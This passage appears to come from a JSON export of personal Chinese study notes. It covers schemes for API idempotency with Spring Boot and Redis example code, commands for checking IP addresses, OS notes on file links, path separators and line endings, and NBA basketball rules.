客户端工具都默认开启超时重试的机制，尤其是第三方调用接口时候，为了防止网络波动超时等造成的请求失败，都会添加重试机制，导致一个请求提交多次。\n4. **消息进行重复消费**： 当使用 MQ 消息中间件时候，如果发生消息中间件出现错误未及时提交消费信息，导致发生重复消费。\n\n> 使用幂等性最大的优势在于使接口保证任何幂等性操作，免去因重试等造成系统产生的未知的问题。\n\n## 引入幂等性后对系统有什么影响？\n幂等性是为了简化客户端逻辑处理，能放置重复提交等操作，但却增加了服务端的逻辑复杂性和成本，其主要是：\n1. 把并行执行的功能改为串行执行，降低了执行效率。\n2. 增加了额外控制幂等的业务逻辑，复杂化了业务功能；\n\n所以在使用时候需要考虑是否引入幂等性的必要性，根据实际业务场景具体分析，除了业务上的特殊要求外，一般情况下不需要引入的接口幂等性。\n\n## 方案一：数据库唯一主键如何实现幂等性？\n数据库`唯一主键`的实现主要是利用数据库中主键唯一约束的特性，一般来说唯一主键比较适用于“插入”时的幂等性，其能保证一张表中只能存在一条带该唯一主键的记录。\n\n使用数据库唯一主键完成幂等性时需要注意的是，该主键一般来说并不是使用数据库中自增主键，而是使用分布式 ID 充当主键，这样才能能保证在分布式环境下 ID 的全局唯一性。\n\n### 适用操作\n- 插入操作\n- 删除操作\n\n### 使用限制\n- 需要生成全局唯一主键 ID；\n\n### 主要流程\n主要流程如下：\n1. 客户端执行创建请求，调用服务端接口。\n2. 服务端执行业务逻辑，生成一个分布式 ID，将该 ID 充当待插入数据的主键，然\n\n后执数据插入操作，运行对应的 SQL 语句。\n3. 服务端将该条数据插入数据库中，如果插入成功则表示没有重复调用接口。如果抛出主键重复异常，则表示数据库中已经存在该条记录，返回错误信息到客户端。\n\n## 方案二：数据库乐观锁如何实现幂等性？\n数据库乐观锁方案一般只能适用于执行`更新操作`的过程，我们可以提前在对应的数据表中多添加一个字段，充当当前数据的版本标识。\n\n这样每次对该数据库该表的这条数据执行更新时，都会将该版本标识作为一个条件，值为上次待更新数据中的版本标识的值。\n\n### 适用操作\n- 更新操作\n\n### 使用限制\n- 需要数据库对应业务表中添加额外字段\n\n### 描述示例\n\n例如，存在如下的数据表中：\n\n为了每次执行更新时防止重复更新，确定更新的一定是要更新的内容，我们通常都会添加一个`version`字段记录当前的记录版本，这样在更新时候将该值带上，那么只要执行更新操作就能确定一定更新的是某个对应版本下的信息。\n\n这样每次执行更新时候，都要指定要更新的版本号，如下操作就能准确更新`version=5`的信息：\n```sql\nUPDATE my_table SET price=price+50,version=version+1 WHERE id=1 AND version=5\n```\n上面`WHERE` 后面跟着条件 `id=1 AND version=5` 被执行后，`id=1` 的 `version` 被更新为 `6`，所以如果重复执行该条 SQL 语句将不生效，因为 `id=1 AND version=5` 的数据已经不存在，这样就能保住更新的幂等，多次更新对结果不会产生影响。\n\n## 方案三：防重 Token 令牌如何实现幂等性？\n针对客户端连续点击或者调用方的超时重试等情况，例如提交订单，此种操作就可以用 `Token` 的机制实现防止重复提交。\n\n简单的说就是调用方在调用接口的时候先向后端请求一个全局 `ID（Token）`，请求的时候携带这个全局 `ID` 一起请求（`Token` 最好将其放到 `Headers` 中），后端需要对这个 `Token` 作为 `Key`，用户信息作为 `Value` 到 `Redis` 中进行键值内容校验，如果 `Key` 存在且 `Value` 匹配就执行删除命令，然后正常执行后面的业务逻辑。如果不存在对应的 `Key` 或 `Value` 不匹配就返回重复执行的错误信息，这样来保证幂等操作。\n\n### 适用操作\n- 插入操作\n- 更新操作\n- 删除操作\n\n### 使用限制\n- 需要生成全局唯一 `Token`串\n- 需要使用第三方组件 `Redis` 进行数据效验\n\n### 主要流程：\n1. 服务端提供获取 Token 的接口，该 Token 可以是一个序列号，也可以是一个分布式 ID 或者 UUID 串。\n2. 客户端调用接口获取 Token，这时候服务端会生成一个 Token 串。\n3. 然后将该串存入 Redis 数据库中，以该 Token 作为 Redis 的键（注意设置过期时间）。\n4. 将 Token 返回到客户端，客户端拿到后应存到表单隐藏域中。\n5. 客户端在执行提交表单时，把 Token 存入到 Headers 中，执行业务请求带上该 Headers。\n6. 服务端接收到请求后从 Headers 中拿到 Token，然后根据 Token 到 Redis 中查找该 key 是否存在。\n7. 服务端根据 Redis 中是否存该 key 进行判断，如果存在就将该 key 删除，然后正常执行业务逻辑。如果不存在就抛异常，返回重复提交的错误信息。\n\n> 注意，在并发情况下，执行 Redis 查找数据与删除需要保证原子性，否则很可能在并发下无法保证幂等性。其实现方法可以使用分布式锁或者使用 Lua 表达式来注销查询与删除操作。\n\n## 方案四: 下游传递唯一序列号如何实现幂等性？\n所谓`请求序列号`，其实就是每次向服务端请求时候附带一个短时间内唯一不重复的序列号，该序列号可以是一个`有序 ID`，也可以是一个`订单号`，一般由下游生成，在调用上游服务端接口时附加该序列号和用于认证的 `ID`。\n\n当上游服务器收到请求信息后拿取该 `序列号` 和下游 `认证ID` 进行组合，形成用于操作 Redis 的 `Key`，然后到 Redis 中查询是否存在对应的 `Key` 的键值对，根据其结果：\n1. 如果存在，就说明已经对该下游的该序列号的请求进行了业务处理，这时可以直接响应重复请求的错误信息。\n2. 如果不存在，就以该 Key 作为 Redis 的键，以下游关键信息作为存储的值（例如下游商传递的一些业务逻辑信息），将该键值对存储到 Redis 中 ，然后再正常执行对应的业务逻辑即可。\n\n### 适用操作\n- 插入操作\n- 更新操作\n- 删除操作\n\n### 使用限制\n- 要求第三方传递唯一序列号；\n- 需要使用第三方组件 Redis 进行数据效验；\n\n### 主要流程\n1. 下游服务生成分布式`ID` 作为序列号，然后执行请求调用上游接口，并附带`唯一序列号`与请求的`认证凭据ID`。\n2. 上游服务进行安全效验，检测下游传递的参数中是否存在`序列号`和`凭据ID`。\n3. 上游服务到 Redis 中检测是否存在对应的`序列号`与`认证ID`组成的 `Key`，如果存在就抛出重复执行的异常信息，然后响应下游对应的错误信息。如果不存在就以该`序列号`和`认证ID`组合作为 `Key`，以下游关键信息作为 `Value`，进而存储到 Redis 中，然后正常执行接来来的业务逻辑。\n\n> 上面步骤中插入数据到 Redis 一定要设置过期时间。这样能保证在这个时间范围内，如果重复调用接口，则能够进行判断识别。如果不设置过期时间，很可能导致数据无限量的存入 Redis，致使 Redis 不能正常工作。\n\n## 实现接口幂等示例\n这里使用防重 Token 令牌方案，该方案能保证在不同请求动作下的幂等性，实现逻辑可以看上面写的”防重 Token 令牌”方案，接下来写下实现这个逻辑的代码。\n\n### 1. Maven 引入相关依赖\n这里使用 Maven 工具管理依赖，这里在 pom.xml 中引入 SpringBoot、Redis、lombok 相关依赖。\n```xml\n<dependencies>\n        <!--springboot web-->\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n        </dependency>\n        <!--springboot data redis-->\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-data-redis</artifactId>\n        </dependency>\n        <dependency>\n            <groupId>org.apache.commons</groupId>\n            <artifactId>commons-pool2</artifactId>\n        </dependency>\n        <!--lombok-->\n        <dependency>\n            <groupId>org.projectlombok</groupId>\n            <artifactId>lombok</artifactId>\n        </dependency>\n    </dependencies>\n```\n### 2. 配置连接 Redis 的参数\n在 application 配置文件中配置连接 Redis 的参数，如下:\n```yml\nspring:\n  redis:\n    ssl: false\n    host: 127.0.0.1\n    port: 6379\n    database: 0\n    timeout: 1000\n    password:\n    lettuce:\n      pool:\n        max-active: 100\n        max-wait: -1\n        min-idle: 0\n        max-idle: 20\n```\n\n### 3. 创建与验证 Token 工具类\n创建用于操作 Token 相关的 Service 类，里面存在 Token 创建与验证方法，其中：\n1. `Token` 创建方法： 使用 `UUID` 工具创建 `Token` 串，设置以 `“idempotent_token:“+“Token串”` 作为 `Key`，以用户信息当成 `Value`，将信息存入 `Redis` 中。\n2. `Token` 验证方法： 接收 Token 串参数，加上 Key 前缀形成 Key，再传入 value 值，执行 Lua 表达式（Lua 表达式能保证命令执行的原子性）进行查找对应 Key 与删除操作。执行完成后验证命令的返回结果，如果结果不为空且非0，则验证成功，否则失败。\n\n```java\n@Slf4j\n@Service\npublic class TokenUtilService {\n\n    @Autowired\n    private StringRedisTemplate redisTemplate;\n\n    /**\n     * 存入 Redis 的 Token 键的前缀\n     */\n    private static final String IDEMPOTENT_TOKEN_PREFIX = \"idempotent_token:\";\n\n    /**\n     * 创建 Token 存入 Redis，并返回该 Token\n     *\n     * @param value 用于辅助验证的 value 值\n     * @return 生成的 Token 串\n     */\n    public String generateToken(String value) {\n        // 实例化生成 ID 工具对象\n        String token = UUID.randomUUID().toString();\n        // 设置存入 Redis 的 Key\n        String key = IDEMPOTENT_TOKEN_PREFIX + token;\n        // 存储 Token 到 Redis，且设置过期时间为5分钟\n        redisTemplate.opsForValue().set(key, value, 5, TimeUnit.MINUTES);\n        // 返回 Token\n        return token;\n    }\n\n    /**\n     * 验证 Token 正确性\n     *\n     * @param token token 字符串\n     * @param value value 存储在Redis中的辅助验证信息\n     * @return 验证结果\n     */\n    public boolean validToken(String token, String value) {\n        // 设置 Lua 脚本，其中 KEYS[1] 是 key，KEYS[2] 是 value\n        String script = \"if redis.call('get', KEYS[1]) == KEYS[2] then return redis.call('del', KEYS[1]) else return 0 end\";\n        RedisScript<Long> redisScript = new DefaultRedisScript<>(script, Long.class);\n        // 根据 Key 前缀拼接 Key\n        String key = IDEMPOTENT_TOKEN_PREFIX + token;\n        // 执行 Lua 脚本\n        Long result = redisTemplate.execute(redisScript, Arrays.asList(key, value));\n        // 根据返回结果判断是否成功成功匹配并删除 Redis 键值对，若果结果不为空和0，则验证通过\n        if (result != null && result != 0L) {\n            log.info(\"验证 token={},key={},value={} 成功\", token, key, value);\n            return true;\n        }\n        log.info(\"验证 token={},key={},value={} 失败\", token, key, value);\n        return false;\n    }\n\n}\n```\n### 4、创建测试的 Controller 类\n创建用于测试的 Controller 类，里面有获取 Token 与测试接口幂等性的接口，内容如下：\n\n```java\n@Slf4j\n@RestController\npublic class TokenController {\n\n    @Autowired\n    private TokenUtilService tokenService;\n\n    /**\n     * 获取 Token 接口\n     *\n     * @return Token 串\n     */\n    @GetMapping(\"/token\")\n    public String getToken() {\n        // 获取用户信息（这里使用模拟数据）\n        // 注：这里存储该内容只是举例，其作用为辅助验证，使其验证逻辑更安全，如这里存储用户信息，其目的为:\n        // - 1)、使用\"token\"验证 Redis 中是否存在对应的 Key\n        // - 2)、使用\"用户信息\"验证 Redis 的 Value 是否匹配。\n        String userInfo = \"mydlq\";\n        // 获取 Token 字符串，并返回\n        return tokenService.generateToken(userInfo);\n    }\n\n    /**\n     * 接口幂等性测试接口\n     *\n     * @param token 幂等 Token 串\n     * @return 执行结果\n     */\n    @PostMapping(\"/test\")\n    public String test(@RequestHeader(value = \"token\") String token) {\n        // 获取用户信息（这里使用模拟数据）\n        String userInfo = \"mydlq\";\n        // 根据 Token 和与用户相关的信息到 Redis 验证是否存在对应的信息\n        boolean result = tokenService.validToken(token, userInfo);\n        // 根据验证结果响应不同信息\n        return result ? \"正常调用\" : \"重复调用\";\n    }\n\n}\n```\n## 最后总结\n幂等性是开发当中很常见也很重要的一个需求，尤其是支付、订单等与金钱挂钩的服务，保证接口幂等性尤其重要。在实际开发中，我们需要针对不同的业务场景我们需要灵活的选择幂等性的实现方式：\n1. 对于下单等存在唯一主键的，可以使用“`唯一主键方案`”的方式实现。\n2. 对于更新订单状态等相关的更新场景操作，使用“`乐观锁方案`”实现更为简单。\n3. 对于上下游这种，下游请求上游，上游服务可以使用“`下游传递唯一序列号方案`”更为合理。\n4. 类似于`前端重复提交`、`重复下单`、`没有唯一ID号`的场景，可以通过 `Token` 与 `Redis` 配合的“`防重 Token 方案`”实现更为快捷。\n\n上面只是给与一些建议，再次强调一下，实现幂等性需要先理解自身业务需求，根据业务逻辑来实现这样才合理，处理好其中的每一个结点细节，完善整体的业务流程设计，才能更好的保证系统的正常运行。\n\n# Know your public and private IP addresses\nYou might have used `ifconfig` command on your linux terminal to know different network configurations of your system.\n\nifconfig command shows hardware address(HWaddr) and network address(inet addr) for Ethernet or your wifi connection.\n\nifconfig command don’t show your public IP address(if public and private are different). For that purpose, you can simple type in google search : what is my ip address, it will show your public IP address.\n\nOn linux terminal, you can use following commands to know your IP addresses:\n\nPublic IP :\n```shell\ncurl ifconfig.me\n      or \ncurl ipinfo.io/ip\n```\n\nPrivate IP :\n```\nhostname -I\n```\n\n# Chrome之Network控制面板\n<div class=\"contianer\">\n  <iframe src=\"https://drive.google.com/file/d/1XmzN9qBr2c3khKRGgoQ2Xr4ncRbqklKb/preview\" width=\"640\" height=\"480\" allow=\"autoplay\"></iframe>\n</div>\n\n<div class=\"contianer\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/KVIVvPnHsM8\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n"
  },
  {
    "title": "./notes/基础知识/操作系统.md",
    "body": "# 文件共享\n现代常用的两种文件共享方法如下。\n\n## 基于索引结点的共享方式(硬链接)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163135.png)\n\n在linux中，这个索引节点对应inode, 如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163209.png)\n\n## 基于符号链的共享方式(软链接)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163218.png)\n\n在linux中，效果如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163228.png)\n\n## PowerShell中没有mklink 命令\n是的，PowerShell 中就是中没有 mklink 命令。如果要在 powershell 中使用 mklink，那么得先敲 cmd 进入 cmd 之后再使用 mklink 命令。\n\n# 绝对路径与相对路径\n绝对路径：从根目录出发的路径称为绝对路径\n相对路径：从当前目录出发的路径称为相对路径\n\n# 斜杠和反斜杠的区别\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163237.png)\n\nUnix使用斜杠/作为路径分割符，而Web应用最先是使用在Unix系统上面，所以目前所有的网络地址都采用斜杠/作为分隔符。Linux又称升级版的Unix，所以路径这方面跟Unix是大同小异的。\nWindows由于使用斜杠/作为DOS命令提示符的参数标志了，为了不混淆，所以采用反斜杠\\作为路径分隔符。所以目前Windows系统上的文件浏览器都是用反斜杠\\作为路径分隔符。随着发展，DOS系统已经被淘汰了，命令提示符也用得很少，斜杠和反斜杠在大多数情况下可以互换，没有影响。\n\n- 统一用正斜杠\"/\"，Windows和Linux都能识别。\n- 网络路径（浏览器地址栏网址）使用 正斜杠/；\n- Windows文件浏览器上使用 反斜杠\\；\n- Windows本地路径既能使用正斜杠，也能使用反斜杠。 \n- 出现在htm url()属性中的路径，指定的路径是网络路径，所以必须使用 正斜杠/；\n```html\n<div \n style=\"\n     background-image:url(/Image/Control/title.jpg); \n     background-repeat:repeat-x; \n     padding:10px 10px 10px 10px\n \">\n </div>\n// 如果url后面用反斜杠，就不会显示任何背景\n```\n- 出现在普通字符串的路径，如果代表的是Windows文件路径，则使用 正斜杠/和 反斜杠\\是一样的；如果代表的是网络文件路径，则必须使用 正斜杠/；\n```html\n // 本地文件路径，/ 和 \\ 是等效的\n <img src=\".\\Image/Control/ding.jpg\" /> \n <img src=\"./Image\\Control\\cai.jpg\" />\n\n // 网络文件路径，一定要使用 斜杆/\n <img src=\"http://hiphotos.baidu.com/yuhua522/pic/item/01a949c67e1023549c163df2.jpg\" /> \n```\n- 单独的一个反斜杠\"\\\"在编程中通常用于转义字符，如\\0表示“空字符”\\r表示“回车”，\\n表示“换行”等；所有通常要用到反斜杠时，要用两个反斜杠\"`\\\\`\"来表示一个反斜杠“\\”的含义。\n- 而\"\\\\\"则表示反斜杠\\的转义字符，在编程中常用于表示反斜杠\\不是普通的字符，而是路径的分隔符。如用一个字符串存储保存文件的路径时，路径为F:\\caffe\\Temp\\image.jpg;则用字符串存储时，应该写为str=F:\\caffe\\Temp\\image.jpg;因为若不这样表示，则反斜杠\\将会当作普通字符，而非路径的分隔符，可能与后面的字母对应上，发生了转义字符的作用。\n\n# 换行符\nLinux中查看换行符\n在Linux中查看换行符的方法应该有很多种，这里介绍两种比较常用的方法。 第一种使用`cat -A [Filename]`查看，如下图所示，看到的为一个Windows形式的换行符，\\r对应符号^M，\\n对应符号$.\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163247.png)\n\n第二种使用vi编辑器查看，然后使用\"set list\"命令显示特殊字符：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163257.png)\n\n细心的朋友发现了，怎么^M还是没显示出来，这里也是给大家提个醒，用VI的二进制模式（`vi -b [FileName]`）打开，才能够显示出^M：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163308.png)\n\n由于\nwindow下默认是 \\r\\n\nlinux下是\\n\nunix下是\\r\n所以要是window文件在linux下正常使用，必须要将\\r\\n换成\\n\n即使用如下命令即可\n```sql\nsed -i 's/\\r//' startup.sh\n```\n"
  },
  {
    "title": "./notes/基础知识/篮球.md",
    "body": "# NBA背景\n国家篮球协会（英语：National Basketball Association，缩写：NBA）是北美的男子职业篮球联盟，由30支球队组成（29支在美国以及1支在加拿大），分属两个联盟（Conference）：东部联盟和西部联盟；而每个联盟各由三个赛区（Division）组成，每个赛区有五支球队。\n\n## 赛季\nNBA正式赛季于每年10月中开始，分为常规赛、季后赛两大部分。常规赛为循环赛制，每支球队都要完成82场比赛；常规赛到次年的4月结束(因疫情期间延至5月)，每个联盟的前八名将有资格进入接下来进行的季后赛。季后赛采用七战四胜赛制，共分四轮；季后赛的最后一轮也称为总决赛，由两个联盟的冠军争夺NBA的最高荣誉──总冠军。整个NBA赛季当中，常规赛完结之后分区冠军不设奖杯，只给予得奖球队锦旗一个，但联盟冠军及总冠军均设有奖杯加锦旗。\n\n### 常规赛\nNBA常规赛为循环赛制，每支球队都要完成82场比赛；常规赛到次年的4月结束，每个分区的前八名，将有资格进入接下来进行的季后赛。\n\n### 季后赛\nNBA季后赛（NBA Playoffs）是NBA常规赛后举行的淘汰赛赛事。每个联盟在常规赛东西部2个联盟最佳成绩的各8队（共16队）会晋身NBA季后赛。约于4月下旬开始。季后赛球队的种子排名由晋级季后赛球队在季前赛的战绩决定。对赛方式如下：拥有较高的种子排名会有许多优势。由于1号种子将挑战8号种子，2号对阵7号，依此类推，因此有较低的种子排名意味着将面对排名较高的对手（但并不代表排名低就实力比较弱\n\n#### 比赛形式\n季后赛实行七场四胜制，每支球队将与对手最多进行7场比赛，最先赢得4场比赛的球队将进入下一轮，而败者被淘汰。\n\n一旬开始，东西部各有八支球队获得季后赛资格，进行赛季最后的争霸。东西两个联盟中各个赛区的冠军加上成绩最好的赛区第二名组成前四号种子，这四支球队再按照常规赛的成绩依次排为一到四号种子。剩余四支球队则按成绩依次排为五到八号种子。\n\n采用2-2-1-1-1的主场分配方法（1985至2013年间，总决赛为2-3-2，2014年起恢复为2-2-1-1-1），拥有4个主场的一方将会在第1、2、5（如果需要）、7（如果需要）场比赛坐镇主场，第3、4、6（如果需要）场则是征战客场。对阵双方的主场优势并非由种子排位的高低来决定，而是由双方在常规赛的成绩（胜率）来决定。因此，如果一个赛区冠军作为4号甚至3号种子，但是常规赛胜率在联盟中却排在5名之后，那么在首轮对阵5号种子或者6号种子的时候将有可能没有主场优势（比较双方对赛成绩）。种子排位只决定球队在季后赛的走势\n\n### NBA总决赛\n季后赛的最后一轮，也就是所谓的 “NBA总决赛”，是在两联盟的胜出者之间进行，最多共举行7场比赛。总决赛在6月举行。总决赛的冠军将获得拉里·奥布莱恩特奖杯，冠军的每位成员都将获得一个NBA总冠军戒指，其中最优秀的球员会获得NBA总决赛最有价值球员的荣誉。而胜出球队往往会于自己城市举行胜利巡游，成为城中大事。\n\n经过3轮的淘汰赛，获得东西部冠军的2队将进入最后的总决赛。总决赛（NBA Finals）一般在每年的6月进行，采用7场4胜2-2-1-1-1的赛制，双方成绩较佳者将获得第1、2、5（如果需要）、7（如果需要）4场的主场权利，成绩较差者将获得第3、4、6（如果需要）3场主场的权利。系列赛由一方先赢得4场比赛就结束，获胜的球队将获得NBA总冠军。冠军球队将捧得拉里·奥布里安冠军奖杯，表现最出色的球员（一般是冠军队球员）将获颁总决赛MVP。每位冠军成员在赛后还会获得一枚总冠军戒指，上面刻有球队标志以及夺冠年份。\n\n常规赛成绩较好的球队同样享有主场优势。1985至2013年间，总决赛的主客场交替曾改为2-3-2；而2014年起，NBA联盟恢复为2-2-1-1-1。\n\n- 【视频】https://www.youtube.com/watch?v=7tbj-YYW4f8&list=PL9YnVokGTWC-Gfj_VPJGHtS-V56mE9cSY&index=1\n\n# 选秀\nNBA选秀为一年一度的NBA盛会，在选秀大会上，30支NBA球队都可以挑选想加入NBA的球员，这些球员通常都是来自美国大学级别的比赛，但近年来被选中的国际球员和高中毕业生越来越多。被选中的球员称为新秀。NBA有三个针对新秀的评选，一个是NBA最佳新秀，另外一个是NBA全明星新秀赛评选。还有NBA最佳新秀阵容。\n\n# 一场篮球赛怎么打\n正规的球赛共分作四节，每一节10分钟。上半场打完1、2节，中场休息15分钟。若未能在正规比赛时间中取得胜利，就会进行加时赛，每节加时赛有5分钟，如仍未能分出胜负，则会再进行，直至分出胜负为止。比赛中，每队要在24秒内进攻，如果未能在24秒内把球投进或碰到我方球篮，就算违例，对方可得到控球权。\n![](https://gitee.com/NaisWang/images/raw/master/img/20211122171448.png)\n\n## 违例\n篮球中的违例是一场比赛中最轻微的违反规则的行为，由于其程度较轻，并不足以对比赛造成不良影响抑或违反体育竞赛精神，故其并非包括技术犯规，违反体育道德的犯规在内的任一严重违反规则之行为，因此，所有队员在不触发犯规的前提下，可无限次违例而不被罚下。并且，大多数违例都是在持球队伍中产生，因为相对于未有持球的球队，前者能触发的违例要比后者的违例多，例如带球走、运球违例等。\n\n一支球队违例时，其球权丧失并转交另一球队，由该球队在距离违例地点最近的场地边线外掷球入界，惟其地点正好在篮板后的除外。\n\n违例可以分为：持球违例、超时违例、其他违例\n- 持球违例: 球回后场、运球违例、带球走步\n- 超时违例: 3秒违例、5秒违例、8秒违例、24秒违例\n- 其他违例: 干涉得分与干扰得分\n\n## 犯规\n- fouled out(犯满离场)。在台湾会昵称为“五犯毕业”。只要在场上集满个人五次犯规，就不得于该场比赛再上场。在NBA等职业比赛是订为六次才犯满，因为他们比赛时间是一般比赛的5/6倍（48/40）\n\n- 犯规可以分为：侵人犯规、双方犯规、技术犯规\n### 侵人犯规\n#### 定义\n侵人犯规是：无论在活球或死球的情况下，攻守双方队员发生的身体接触的犯规。\n队员不应通过伸展他的手、臂、肘、肩、髋、腿、膝、脚或将其身体弯曲成“不正确的姿势”（超出他的圆柱体）去拉、阻挡、推、撞、绊对方队员，或阻止对方队员行进；也不得放纵任何粗野或猛烈的动作去这样做。\n#### 罚则\n应登记犯规队员一次侵人犯规。\n- 如果对没有做投篮动作的队员发生犯规：\n\t- 由非犯规的队在最靠近违犯的地点掷球入界重新开始比赛。\n\t- 如果犯规的队处于全队犯规处罚状态，则应运用第41条（全队犯规：处罚）的规定。\n\n- 如果对正在做投篮动作的队员发生犯规，应按下列所述判给投篮队员若干罚球：\n\t- 如果投篮成功，应计得分并判给1次追加的罚球。\n\t- 如果从2分投篮区域的投篮不成功：2次罚球。\n\t- 如果从3分投篮区域的投篮不成功：3次罚球。\n\t- 在结束一节的比赛计时钟信号时或恰好响之前，或当24秒钟装置信号响时或恰好响之前，队员被犯规了，此时球仍在该队员的手中，并且投篮成功，不应计得分，应判给2或3次罚球\n\n### 双方犯规\n#### 定义\n双方犯规是两名互为对方的队员大约同时相互发生侵人犯规的情况。\n#### 罚则\n应给每一犯规队员登记一次侵人犯规。不判给罚球。\n\n### 技术犯规\n#### 定义\n技术犯规是没有身体接触的犯规，行为种类包括但不限于：\n技术犯规（英语：Technical foul）是指篮球比赛一方的球员（包括上场和替补）或教练、随队人员作出以下行为：\n- 与裁判交谈时无礼貌\n- 动作粗野\n- 侮辱对手\n- 被判侵人犯规后没有按要求举手\n- 在没有球在手时抓篮圈，或是灌篮后双手抓着篮圈摇晃不放手\n擅自进入赛场范围\n\n#### 罚则\n裁判向记录员通知及要求登记有关人士一次技术犯规\n若犯规者是上场球员，裁判会给予对方一次罚球(2014修改)；投篮后无论中篮与否，于中线外掷界外球\n若犯规者是替补球员或教练抑或随队人员，裁判会给予对方一次罚球；投篮后无论中篮与否，于中线外掷界外球\n\n# 球场划分\n![](https://gitee.com/NaisWang/images/raw/master/img/20211122172701.png)\n- 两边黑框区---禁区或称3秒区\n- 两边红线----罚球线\n- 3个绿圈----跳球区\n- 1条黄线----球场中线\n- 两条灰线----球场边线\n- 两条紫线----球场底线\n- 两条白色弧线----三分线\n\n# 球员职责\n![](https://gitee.com/NaisWang/images/raw/master/img/20211122161950.png)\n|位置|主要职责|特征|需具备的能力|\n|--|--|--||\n|1号/控球后卫/Point Guard(PG)|组织进攻、指挥战术、掌控节奏|传球第一，得分第二|运球、控球、传球、宽阔视野|\n|2号/得分后卫/Shooting Guard(SG)|得分、外场投篮|球来就射|投篮稳定、精准、出手快速|\n|3号/小前锋/Small Forward(SF)|头号得分手|把球弄进篮筐就对了|远投近切、全面的得分技术|\n|4号/大前锋/Power Forward(PF)|禁区卡位、抢篮板、防守|“场上的蓝领苦工”|防守拼劲、抢板意识|\n|5号/中峰/Center(C)|攻防枢纽、卡位、抢篮板|场上的中心，长最高的那位|禁区进攻手段、防守拼劲、盖帽、抢板意识|\n\n- 【视频】https://www.bilibili.com/video/BV1o4411g7h4\n\n# 进攻撞人犯规和防守阻挡犯规\n- 【如何判断一起接触是进攻撞人犯规和防守阻挡犯规--丁老师讲规则系列视频】https://www.bilibili.com/video/BV1qv411G7VA/?spm_id_from=333.788.recommend_more_video.4 \n\n# 走步\n## 基本概念：收球/中枢脚/旋转/行进间\n本节我们介绍带球走的几个关键概念，包括`收球`、`行进间`、`中枢脚`、`旋转`等等。这一部分是第二、三部分进行判断的基础。这些概念绝大部分是FIBA/NBA规则的官方说明，但为了方便理解，也会有阁楼个人的解释，在文中我会进行来源标注。\n\n### 概念1 带球走（Travelling）\n> 25.1.1 当队员在场上持着一个活球，其一脚或双脚超出规则所述的限制，向任一方向非法的运动是带球走。\n\n我们所讨论的走步，规则术语称为带球走（Travelling）。我们看到，在规则定义中确立了走步违例的大前提有两点：`持球（holding a live ball）`、以及`超出条款限制的移动`。反过来说：如果没有持球，就不可能走步违例。如果没有超出条款限制的移动，就不可能走步违例。\n\n所以一个关键问题就是，如何认定持球？对于这个问题，NBA去年给出了一个重要规则概念叫做“收球”（Gather）。\n\n### 概念2 收球（Gather）\n> a. For a player who receives a pass or gains possession of a loose ball, the gather is defined as the point where the player gains enough control of the ball to hold it, change hands, pass, shoot, or cradle it against his body.\n对于接传球/争抢球的情况，当球员已经获得对球足够的控制，可以拿住球、换手、传球、投篮或把球抱在自己身体上时，这个时间点被定义为收球。\n\n![](https://gitee.com/NaisWang/images/raw/master/img/未命名.gif)\nNBA官方判例：接到队友传球完成收球。\n\n![](https://gitee.com/NaisWang/images/raw/master/img/640-3.gif)\nNBA官方判例：争抢到失去控制的球并完成收球。\n\n> b. For a player who is in control of the ball while dribbling, the gather is defined as the point where a player does any one of the following: \n> 1. Puts two hands on the ball, or otherwise permits the ball to come to rest, while he is in control of it; \n> 2. Puts a hand under the ball and brings it to a pause; or \n> 3. Otherwise gains enough control of the ball to hold it, change hands, pass, shoot, or cradle it against his body.\n\n> 对于结束运球的情况，当\n> 1. 在他控制球的时候用双手触球，或以其他方式让球在手中停留；\n> 2. 把手放在球的下面让球在手中停留；\n> 3. 获得对球足够的控制，可以拿住球、换手、传球、投篮或把球抱在自己身体上时。\n这个时间点被定义为收球。\n\n![](https://gitee.com/NaisWang/images/raw/master/img/640-3a.gif)\nNBA官方判例：结束运球时，双手合球完成收球。\n\n![](https://gitee.com/NaisWang/images/raw/master/img/640-4a.gif)\nNBA官方判例：结束运球时，单手从下方托球完成收球。\n\n![](https://gitee.com/NaisWang/images/raw/master/img/640-6a.gif)\nNBA官方判例：结束运球时，把球抱在自己身上完成收球。\n\n注意这个“the gather is defined as the point”，言下之意，在完成收球这个时间点之前我们并不认为存在持球，自然也就不存在走步违例，过早考虑脚步的移动，或者说数123步，是没有意义的。例如：\n\n![](https://gitee.com/NaisWang/images/raw/master/img/640-7a.gif)\n非官方举例：卡特拿到篮板之前多次拍击球，这不是收球\n\n![](https://gitee.com/NaisWang/images/raw/master/img/640-8a.gif)\n官方举例：哈登双手合球之前左手在球的侧面，这不是收球。\n\n那么怎么界定移动有否超出条款限制呢？在FIBA规则25.2.1中把带球走违例分成了两种情况进行判断：\n> 25.2.1 对在场上接住活球的队员确立中枢脚，有：\n·一名队员接住球时，双脚站在地面上……\n·一名队员在移动中或在结束运球时拿球……[1]\n\n我们看到其中一种情况是“双脚站在地面上”，另一种是“在移动中或在结束运球时”。这也就是我们会在本文第二、第三部分讨论的重点。注意在这两种情况下，走步违例的判断是截然不同的！\n\n在这里我个人把两种情况简单表述为如下概念：\n概念3 站立时（Standing）和行进间（Progressing）：\n\n### 概念3 站立时（Standing）和行进间（Progressing）：\n站立时很简单，双脚着地拿球就是站立时，官方举例如下：\n![](https://gitee.com/NaisWang/images/raw/master/img/640-9a.gif)\n行进间也很简单，就是在跑动中。例如跑动中接到传球，或者结束运球上篮。官方举例如下：\n![](https://gitee.com/NaisWang/images/raw/master/img/640-10a.gif)\n![](https://gitee.com/NaisWang/images/raw/master/img/640-11a.gif)\n记住这个区别，后边要用。\n\n另一个关键概念是25.2.1提及的规则术语`中枢脚（pivot 